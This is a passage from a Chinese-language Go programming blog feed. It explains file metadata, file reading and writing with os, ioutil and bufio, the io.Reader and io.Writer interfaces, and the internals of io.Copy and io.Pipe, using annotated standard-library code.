punctuation">)</span> <span class="token builtin">string</span>       <span class="token comment" spellcheck="true">// base name of the file</span>    <span class="token function">Size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token builtin">int64</span>        <span class="token comment" spellcheck="true">// length in bytes for regular files; system-dependent for others</span>    <span class="token function">Mode</span><span class="token punctuation">(</span><span class="token punctuation">)</span> FileMode     <span class="token comment" spellcheck="true">// file mode bits</span>    <span class="token function">ModTime</span><span class="token punctuation">(</span><span class="token punctuation">)</span> time<span class="token punctuation">.</span>Time <span class="token comment" spellcheck="true">// modification time</span>    <span class="token function">IsDir</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token builtin">bool</span>        <span class="token comment" spellcheck="true">// abbreviation for Mode().IsDir()</span>    <span class="token function">Sys</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">interface</span><span class="token punctuation">{</span><span class="token punctuation">}</span>   <span class="token comment" spellcheck="true">// underlying data source (can return nil)</span><span class="token punctuation">}</span></code></pre><ul><li><p>例子</p><pre class=" language-go"><code class="language-go"><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    fd<span class="token punctuation">,</span> err <span class="token operator">:=</span> os<span class="token punctuation">.</span><span class="token function">Open</span><span class="token punctuation">(</span><span class="token string">"./1.txt"</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>        fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span>    <span class="token punctuation">}</span>    fi<span class="token punctuation">,</span> err <span class="token operator">:=</span> fd<span class="token punctuation">.</span><span class="token function">Stat</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>        fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span>    <span class="token punctuation">}</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>fi<span class="token punctuation">.</span><span class="token function">Size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>     <span class="token comment" spellcheck="true">//28</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>fi<span class="token punctuation">.</span><span class="token function">Name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>     <span class="token comment" spellcheck="true">//1.txt</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>fi<span class="token punctuation">.</span><span class="token function">Mode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>     <span class="token comment" spellcheck="true">//-rw-rw-rw-</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>fi<span class="token punctuation">.</span><span class="token function">ModTime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">//2020-10-16 11:06:14.8511679 +0800 CST</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>fi<span class="token punctuation">.</span><span class="token function">IsDir</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">//false</span><span class="token punctuation">}</span></code></pre></li></ul></li></ul><h5 id="0x01-读取文件"><a href="#0x01-读取文件" class="headerlink" title="0x01 读取文件"></a>0x01 读取文件</h5><ul><li><p><code>func (f *File) Read(b []byte) (n int, err error)</code></p></li><li><p><code>ioutil.ReadFile()</code>：读取整个文件内容并返回。</p><pre class=" language-go"><code class="language-go"><span class="token comment" spellcheck="true">// ReadFile reads the file named by filename and returns the contents.</span><span class="token comment" spellcheck="true">// A successful call returns err == nil, not err == EOF. Because ReadFile</span><span class="token comment" spellcheck="true">// reads the whole file, it does not treat an EOF from Read as an error</span><span class="token comment" spellcheck="true">// to be reported.</span><span class="token keyword">func</span> <span class="token function">ReadFile</span><span class="token punctuation">(</span>filename <span class="token builtin">string</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">byte</span><span class="token punctuation">,</span> <span class="token builtin">error</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    f<span class="token punctuation">,</span> err <span class="token operator">:=</span> os<span class="token punctuation">.</span><span class="token function">Open</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span>    <span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token boolean">nil</span><span class="token punctuation">,</span> err    <span class="token punctuation">}</span>    <span class="token keyword">defer</span> f<span class="token punctuation">.</span><span class="token function">Close</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">var</span> n <span class="token builtin">int64</span> <span class="token operator">=</span> bytes<span class="token punctuation">.</span>MinRead    <span class="token keyword">if</span> fi<span class="token punctuation">,</span> err <span class="token operator">:=</span> f<span class="token punctuation">.</span><span class="token function">Stat</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> err <span class="token operator">==</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> size <span class="token operator">:=</span> fi<span class="token punctuation">.</span><span class="token function">Size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> bytes<span class="token punctuation">.</span>MinRead<span class="token punctuation">;</span> size <span class="token operator">></span> n <span class="token punctuation">{</span>            n <span class="token operator">=</span> size        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token function">readAll</span><span class="token punctuation">(</span>f<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">}</span></code></pre><ul><li><p>例子：</p><pre class=" language-go"><code class="language-go"><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    result<span class="token punctuation">,</span> err <span class="token operator">:=</span> ioutil<span class="token punctuation">.</span><span class="token function">ReadFile</span><span class="token punctuation">(</span><span class="token string">"./test.txt"</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>        fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span>    <span class="token punctuation">}</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token function">string</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">}</span></code></pre></li></ul></li><li><p><code>bufio.NewReader(fd)</code></p><ul><li><p><code>func (b *Reader) Peek(n int) ([]byte, error)</code>   // read next n byte</p></li><li><p><code>func (b *Reader) ReadLine() (line []byte, isPrefix bool, err error)</code>   //读取数据直到遇到换行符。</p></li><li><p><code>func (b *Reader) ReadString(delim byte) (string, error)</code>   //读取数据直到遇到分隔符（<code>delim</code>）。</p><pre class=" language-go"><code class="language-go"><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    f<span class="token punctuation">,</span> err <span class="token operator">:=</span> os<span class="token punctuation">.</span><span class="token function">Open</span><span class="token punctuation">(</span><span class="token string">"./test.txt"</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//打开文件，返回获得文件句柄及err</span>    <span class="token keyword">defer</span> f<span class="token punctuation">.</span><span class="token function">Close</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>        fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span>        <span class="token keyword">return</span>    <span class="token punctuation">}</span>    reader <span class="token operator">:=</span> bufio<span class="token punctuation">.</span><span class="token function">NewReader</span><span class="token punctuation">(</span>f<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">//封装*File</span>    <span class="token keyword">var</span> content <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">byte</span>    <span class="token keyword">for</span> <span class="token punctuation">{</span>        str<span class="token punctuation">,</span> err <span class="token operator">:=</span> reader<span class="token punctuation">.</span><span class="token function">ReadString</span><span class="token punctuation">(</span><span class="token string">'s'</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> err <span class="token operator">==</span> io<span class="token punctuation">.</span>EOF <span class="token operator">&amp;&amp;</span> <span class="token function">len</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span> <span class="token punctuation">{</span>            fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"文件读取完毕"</span><span class="token punctuation">)</span>            <span class="token keyword">break</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token operator">&amp;&amp;</span> err <span class="token operator">!=</span> io<span class="token punctuation">.</span>EOF <span class="token punctuation">{</span>            fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span>        <span class="token punctuation">}</span>        fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span>        content <span class="token operator">=</span> <span class="token function">append</span><span class="token punctuation">(</span>content<span class="token punctuation">,</span> str<span class="token operator">...</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token function">string</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">}</span></code></pre></li></ul></li></ul><h5 id="0x02-写入文件"><a href="#0x02-写入文件" class="headerlink" title="0x02 写入文件"></a>0x02 写入文件</h5><ul><li><code>func (f *File) Write(b []byte) (n int, err error)</code></li><li><code>bufio.NewWriter(fd)</code><ul><li><code>func (b *Writer) Write(p []byte) (nn int, err error)</code></li><li><code>func (b *Writer) WriteString(s string) (int, error) </code></li></ul></li><li><code>ioutil.WriteFile()</code><ul><li><code>func WriteFile(filename string, data []byte, perm os.FileMode) error</code></li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> Golang </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Go基础知识 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Golang学习之路—IO</title>
      <link href="2020/10/15/Golang%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF%E2%80%94IO/"/>
      <url>2020/10/15/Golang%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF%E2%80%94IO/</url>
      
        <content type="html"><![CDATA[<h2 id="一、io-Reader-io-Writer"><a href="#一、io-Reader-io-Writer" class="headerlink" title="一、io.Reader/io.Writer"></a>一、io.Reader/io.Writer</h2><blockquote><p>在Go中，<code>io.Reader</code>和<code>io.Writer</code>是很常见的两个接口，遂做个总结。</p></blockquote><h5 id="0x00-io-Reader"><a href="#0x00-io-Reader" class="headerlink" title="0x00 io.Reader"></a>0x00 io.Reader</h5><p>接口定义如下：</p><pre class=" language-go"><code class="language-go"><span class="token comment" spellcheck="true">// Reader is the interface that wraps the basic Read method.</span><span class="token comment" spellcheck="true">//</span><span class="token comment" spellcheck="true">// Read reads up to len(p) bytes into p. It returns the number of bytes</span><span class="token comment" spellcheck="true">// read (0 &lt;= n &lt;= len(p)) and any error encountered. Even if Read</span><span class="token comment" spellcheck="true">// returns n &lt; len(p), it may use all of p as scratch space during the call.</span><span class="token comment" spellcheck="true">// If some data is available but not len(p) bytes, Read conventionally</span><span class="token comment" spellcheck="true">// returns what is available instead of waiting for more.</span><span class="token keyword">type</span> Reader <span class="token keyword">interface</span> <span class="token punctuation">{</span>    <span class="token function">Read</span><span class="token punctuation">(</span>p <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">byte</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>n <span class="token builtin">int</span><span class="token punctuation">,</span> err <span class="token builtin">error</span><span class="token punctuation">)</span><span class="token punctuation">}</span></code></pre><ul><li><p><code>Read</code>方法实现从”输入流”中读取<code>len(p)</code>长度的数据到切片<code>p</code>中，并返回读取的数据的长度（<code>0&lt;=n&lt;=len(p)</code>）及<code>error</code>。</p></li><li><p>当”输入流”可读取的数据长度小于<code>len(p)</code>时，会直接读取当前可读取的数据，而不会等待数据流数据达到<code>len(p)</code>。</p></li><li><p>读取到输入流最后时，会返回EOF错误<code>err=EOF</code>。</p></li><li><p><code>Read</code>方法返回值<code>n</code>与<code>err</code>可能出现的情况：</p><ul><li><p>正常读取且输入流数据未读取完时：<code>n=len(p),err=nil</code></p></li><li><p>从输入流中读取最后的<code>x</code>字节（<code>x&lt;len(p)</code>）长度数据：<code>n=x,err=EOF</code>。再进行一次读取，就会得到：<code>n=0,err=EOF</code></p><blockquote><p>结论：应该总是先考虑<code>n&gt;0</code>的情况，即成功读取了<code>n</code>字节数据，再考虑处理<code>err</code>，因为在下一次读取数据时还是会得到<code>n=0,err=EOF</code>错误。</p></blockquote></li></ul></li></ul><p><strong>几点总结：</strong></p><ul><li>前面说的“输入流”可以是文件、标准输入输出、切片等等，是什么取决于<code>Read</code>方法的实际实现，由谁提供数据作为数据源。</li><li>实现了<code>io.Reader</code>接口的，则可以将其当作<code>数据源</code>，因为它终究目的是会被调用其<code>Read</code>方法。</li></ul><h5 id="0x01-io-Writer"><a href="#0x01-io-Writer" class="headerlink" title="0x01 io.Writer"></a>0x01 io.Writer</h5><p>接口定义如下：</p><pre class=" language-go"><code class="language-go"><span class="token comment" spellcheck="true">// Writer is the interface that wraps the basic Write method.</span><span class="token comment" spellcheck="true">//</span><span class="token comment" spellcheck="true">// Write writes len(p) bytes from p to the underlying data stream.</span><span class="token comment" spellcheck="true">// It returns the number of bytes written from p (0 &lt;= n &lt;= len(p))</span><span class="token comment" spellcheck="true">// and any error encountered that caused the write to stop early.</span><span class="token comment" spellcheck="true">// Write must return a non-nil error if it returns n &lt; len(p).</span><span class="token comment" spellcheck="true">// Write must not modify the slice data, even temporarily.</span><span class="token comment" spellcheck="true">//</span><span class="token comment" spellcheck="true">// Implementations must not retain p.</span><span class="token keyword">type</span> Writer <span class="token keyword">interface</span> <span class="token punctuation">{</span>    <span class="token function">Write</span><span class="token punctuation">(</span>p <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">byte</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>n <span class="token builtin">int</span><span class="token punctuation">,</span> err <span class="token builtin">error</span><span class="token punctuation">)</span><span class="token punctuation">}</span></code></pre><ul><li><code>Write</code>方法实现将<code>p</code>中<code>len(p)</code>长度数据的数据写入输出流中,并返回写入的字节数（<code>n&lt;=0&lt;=len(p)</code>）及<code>error</code>，当<code>n&gt;0</code>时(表示成功写入了<code>n</code>字节数据)，<code>err</code>必须为<code>nil</code>。</li></ul><p><strong>几点总结：</strong></p><ul><li>前面说的“输出流”可以是文件、标准输入输出、切片等等，是什么取决于<code>Write</code>方法的实际实现。</li><li>实现了<code>io.Writer</code>接口的，则可以将其当作<code>数据输出</code>，因为它终究目的是会被调用其<code>Write</code>方法。</li></ul><h5 id="0x03-io-ReadFrom-io-WriteTo"><a href="#0x03-io-ReadFrom-io-WriteTo" class="headerlink" title="0x03 io.ReadFrom/io.WriteTo"></a>0x03 io.ReadFrom/io.WriteTo</h5><blockquote><p>这两个接口实际是对<code>io.Reader</code>和<code>io.Writer</code>接口的二次封装：</p><ul><li>其中<code>ReadFrom</code>方法实现持续读取数据直到<code>EOF</code>，本质是多次调用<code>io.Reader</code>的<code>Read</code>方法，并判断是否<code>EOF</code>。</li><li>其中<code>WriteTo</code>方法实现持续写入数据直到没有数据，本质是多次调用<code>io.Writer</code>的<code>Read</code>方法，并判断是否写完数据。</li></ul></blockquote><p>接口定义如下：</p><pre class=" language-go"><code class="language-go"><span class="token comment" spellcheck="true">// ReaderFrom is the interface that wraps the ReadFrom method.</span><span class="token comment" spellcheck="true">//</span><span class="token comment" spellcheck="true">// ReadFrom reads data from r until EOF or error.</span><span class="token comment" spellcheck="true">// The return value n is the number of bytes read.</span><span class="token comment" spellcheck="true">// Any error except io.EOF encountered during the read is also returned.</span><span class="token comment" spellcheck="true">//</span><span class="token comment" spellcheck="true">// The Copy function uses ReaderFrom if available.</span><span class="token keyword">type</span> ReaderFrom <span class="token keyword">interface</span> <span class="token punctuation">{</span>    <span class="token function">ReadFrom</span><span class="token punctuation">(</span>r Reader<span class="token punctuation">)</span> <span class="token punctuation">(</span>n <span class="token builtin">int64</span><span class="token punctuation">,</span> err <span class="token builtin">error</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">// WriterTo is the interface that wraps the WriteTo method.</span><span class="token comment" spellcheck="true">//</span><span class="token comment" spellcheck="true">// WriteTo writes data to w until there's no more data to write or</span><span class="token comment" spellcheck="true">// when an error occurs. The return value n is the number of bytes</span><span class="token comment" spellcheck="true">// written. Any error encountered during the write is also returned.</span><span class="token comment" spellcheck="true">//</span><span class="token comment" spellcheck="true">// The Copy function uses WriterTo if available.</span><span class="token keyword">type</span> WriterTo <span class="token keyword">interface</span> <span class="token punctuation">{</span>    <span class="token function">WriteTo</span><span class="token punctuation">(</span>w Writer<span class="token punctuation">)</span> <span class="token punctuation">(</span>n <span class="token builtin">int64</span><span class="token punctuation">,</span> err <span class="token builtin">error</span><span class="token punctuation">)</span><span class="token punctuation">}</span></code></pre><h2 id="二、io"><a href="#二、io" class="headerlink" title="二、io"></a>二、io</h2><h5 id="0x00-io-Copy-io-CopyBuffer"><a href="#0x00-io-Copy-io-CopyBuffer" class="headerlink" title="0x00 io.Copy()/io.CopyBuffer()"></a>0x00 io.Copy()/io.CopyBuffer()</h5><blockquote><p>函数实现数据复制功能。从<code>io.Reader</code>读取数据（实质调用<code>Read</code>方法）写入<code>io.Writer</code>中（实质调用<code>Write</code>）方法。</p><p><code>io.Copy()</code>与<code>io.CopyBuffer()</code>的区别在于，前者自动帮我们实现了缓存，而后者需要我们自行实现，然而实质上它们最终都会调用<code>io.copyBuffer()</code>函数。</p></blockquote><pre class=" language-go"><code class="language-go"><span class="token keyword">func</span> <span class="token function">Copy</span><span class="token punctuation">(</span>dst Writer<span class="token punctuation">,</span> src Reader<span class="token punctuation">)</span> <span class="token punctuation">(</span>written <span class="token builtin">int64</span><span class="token punctuation">,</span> err <span class="token builtin">error</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token function">copyBuffer</span><span class="token punctuation">(</span>dst<span class="token punctuation">,</span> src<span class="token punctuation">,</span> <span class="token boolean">nil</span><span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">//实际调用的是io.copyBuffer</span><span class="token punctuation">}</span><span class="token keyword">func</span> <span class="token function">CopyBuffer</span><span class="token punctuation">(</span>dst Writer<span class="token punctuation">,</span> src Reader<span class="token punctuation">,</span> buf <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">byte</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>written <span class="token builtin">int64</span><span class="token punctuation">,</span> err <span class="token builtin">error</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> buf <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token operator">&amp;&amp;</span> <span class="token function">len</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span> <span class="token punctuation">{</span>        <span class="token function">panic</span><span class="token punctuation">(</span><span class="token string">"empty buffer in io.CopyBuffer"</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token function">copyBuffer</span><span class="token punctuation">(</span>dst<span class="token punctuation">,</span> src<span class="token punctuation">,</span> buf<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">func</span> <span class="token function">copyBuffer</span><span class="token punctuation">(</span>dst Writer<span class="token punctuation">,</span> src Reader<span class="token punctuation">,</span> buf <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">byte</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>written <span class="token builtin">int64</span><span class="token punctuation">,</span> err <span class="token builtin">error</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// 如果实现了ReaderFrom和WriterTo接口，则优先调用ReadFrom()和WriteTo()方法。</span>    <span class="token comment" spellcheck="true">// Avoids an allocation and a copy.</span>    <span class="token keyword">if</span> wt<span class="token punctuation">,</span> ok <span class="token operator">:=</span> src<span class="token punctuation">.</span><span class="token punctuation">(</span>WriterTo<span class="token punctuation">)</span><span class="token punctuation">;</span> ok <span class="token punctuation">{</span>        <span class="token keyword">return</span> wt<span class="token punctuation">.</span><span class="token function">WriteTo</span><span class="token punctuation">(</span>dst<span class="token punctuation">)</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// Similarly, if the writer has a ReadFrom method, use it to do the copy.</span>    <span class="token keyword">if</span> rt<span class="token punctuation">,</span> ok <span class="token operator">:=</span> dst<span class="token punctuation">.</span><span class="token punctuation">(</span>ReaderFrom<span class="token punctuation">)</span><span class="token punctuation">;</span> ok <span class="token punctuation">{</span>        <span class="token keyword">return</span> rt<span class="token punctuation">.</span><span class="token function">ReadFrom</span><span class="token punctuation">(</span>src<span class="token punctuation">)</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> buf <span class="token operator">==</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">//自动创建缓存</span>        size <span class="token operator">:=</span> <span class="token number">32</span> <span class="token operator">*</span> <span class="token number">1024</span>        <span class="token keyword">if</span> l<span class="token punctuation">,</span> ok <span class="token operator">:=</span> src<span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token operator">*</span>LimitedReader<span class="token punctuation">)</span><span class="token punctuation">;</span> ok <span class="token operator">&amp;&amp;</span> <span class="token function">int64</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span> <span class="token operator">></span> l<span class="token punctuation">.</span>N <span class="token punctuation">{</span>            <span class="token keyword">if</span> l<span class="token punctuation">.</span>N <span class="token operator">&lt;</span> <span class="token number">1</span> <span class="token punctuation">{</span>                size <span class="token operator">=</span> <span class="token number">1</span>            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                size <span class="token operator">=</span> <span class="token function">int</span><span class="token punctuation">(</span>l<span class="token punctuation">.</span>N<span class="token punctuation">)</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        buf <span class="token operator">=</span> <span class="token function">make</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">byte</span><span class="token punctuation">,</span> size<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">//用于存储数据</span>    <span class="token punctuation">}</span>    <span class="token keyword">for</span> <span class="token punctuation">{</span>        nr<span class="token punctuation">,</span> er <span class="token operator">:=</span> src<span class="token punctuation">.</span><span class="token function">Read</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">//调用io.Reader的Read方法读取数据到buf缓存中。</span>        <span class="token keyword">if</span> nr <span class="token operator">></span> <span class="token number">0</span> <span class="token punctuation">{</span>            nw<span class="token punctuation">,</span> ew <span class="token operator">:=</span> dst<span class="token punctuation">.</span><span class="token function">Write</span><span class="token punctuation">(</span>buf<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span>nr<span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">//调用io.Writer的Write方法将buf缓存中的数据写入。</span>            <span class="token keyword">if</span> nw <span class="token operator">></span> <span class="token number">0</span> <span class="token punctuation">{</span>                written <span class="token operator">+=</span> <span class="token function">int64</span><span class="token punctuation">(</span>nw<span class="token punctuation">)</span>            <span class="token punctuation">}</span>            <span class="token keyword">if</span> ew <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>                err <span class="token operator">=</span> ew                <span class="token keyword">break</span>            <span class="token punctuation">}</span>            <span class="token keyword">if</span> nr <span class="token operator">!=</span> nw <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">//写入数据的长度不等于读取的数据的长度，即写入数据发生问题。</span>                err <span class="token operator">=</span> ErrShortWrite                <span class="token keyword">break</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span> er <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>   <span class="token comment" spellcheck="true">//读取数据EOF或其它错误发生</span>            <span class="token keyword">if</span> er <span class="token operator">!=</span> EOF <span class="token punctuation">{</span>                err <span class="token operator">=</span> er            <span class="token punctuation">}</span>            <span class="token keyword">break</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> written<span class="token punctuation">,</span> err<span class="token punctuation">}</span></code></pre><h5 id="0x01-io-Pipe"><a href="#0x01-io-Pipe" class="headerlink" title="0x01 io.Pipe()"></a>0x01 io.Pipe()</h5><blockquote><p>创建一个管道（本质是一个被<code>io.Reader</code>和<code>io.Writer</code>共享的<code>chan []byte</code>）。</p><p>管道没有实现缓存，因此管道最多只能存在一个元素。</p></blockquote><pre class=" language-go"><code class="language-go"><span class="token keyword">func</span> <span class="token function">Pipe</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token operator">*</span>PipeReader<span class="token punctuation">,</span> <span class="token operator">*</span>PipeWriter<span class="token punctuation">)</span> <span class="token punctuation">{</span>    p <span class="token operator">:=</span> <span class="token operator">&amp;</span>pipe<span class="token punctuation">{</span>        wrCh<span class="token punctuation">:</span> <span class="token function">make</span><span class="token punctuation">(</span><span class="token keyword">chan</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">byte</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        rdCh<span class="token punctuation">:</span> <span class="token function">make</span><span class="token punctuation">(</span><span class="token keyword">chan</span> <span class="token builtin">int</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        done<span class="token punctuation">:</span> <span class="token function">make</span><span class="token punctuation">(</span><span class="token keyword">chan</span> <span class="token keyword">struct</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token operator">&amp;</span>PipeReader<span class="token punctuation">{</span>p<span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>PipeWriter<span class="token punctuation">{</span>p<span class="token punctuation">}</span>  <span class="token comment" spellcheck="true">//两个结构体分别实现了Reader和Writer接口，但最终都会调用到pipe结构体的Read和Write方法。两个使用同一个pipe实现共享内存。</span><span class="token punctuation">}</span><span class="token keyword">type</span> pipe <span class="token keyword">struct</span> <span class="token punctuation">{</span>    wrMu sync<span class="token punctuation">.</span>Mutex <span class="token comment" spellcheck="true">// Serializes Write operations</span>    wrCh <span class="token keyword">chan</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">byte</span>    rdCh <span class="token keyword">chan</span> <span class="token builtin">int</span>    once sync<span class="token punctuation">.</span>Once <span class="token comment" spellcheck="true">// Protects closing done</span>    done <span class="token keyword">chan</span> <span class="token keyword">struct</span><span class="token punctuation">{</span><span class="token punctuation">}</span>    rerr onceError    werr onceError<span class="token punctuation">}</span><span class="token keyword">func</span> <span class="token punctuation">(</span>p <span class="token operator">*</span>pipe<span class="token punctuation">)</span> <span class="token function">Read</span><span class="token punctuation">(</span>b <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">byte</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>n <span class="token builtin">int</span><span class="token punctuation">,</span> err <span class="token builtin">error</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">select</span> <span class="token punctuation">{</span>    <span class="token keyword">case</span> <span class="token operator">&lt;-</span>p<span class="token punctuation">.</span>done<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">,</span> p<span class="token punctuation">.</span><span class="token function">readCloseError</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">default</span><span class="token punctuation">:</span>    <span class="token punctuation">}</span>    <span class="token keyword">select</span> <span class="token punctuation">{</span>    <span class="token keyword">case</span> bw <span class="token operator">:=</span> <span class="token operator">&lt;-</span>p<span class="token punctuation">.</span>wrCh<span class="token punctuation">:</span>        nr <span class="token operator">:=</span> <span class="token function">copy</span><span class="token punctuation">(</span>b<span class="token punctuation">,</span> bw<span class="token punctuation">)</span>        p<span class="token punctuation">.</span>rdCh <span class="token operator">&lt;-</span> nr        <span class="token keyword">return</span> nr<span class="token punctuation">,</span> <span class="token boolean">nil</span>    <span class="token keyword">case</span> <span class="token operator">&lt;-</span>p<span class="token punctuation">.</span>done<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">,</span> p<span class="token punctuation">.</span><span class="token function">readCloseError</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">func</span> <span class="token punctuation">(</span>p <span class="token operator">*</span>pipe<span class="token punctuation">)</span> <span class="token function">Write</span><span class="token punctuation">(</span>b <span class="token punctuation">[</span><span class="token punctuation">]</span><span 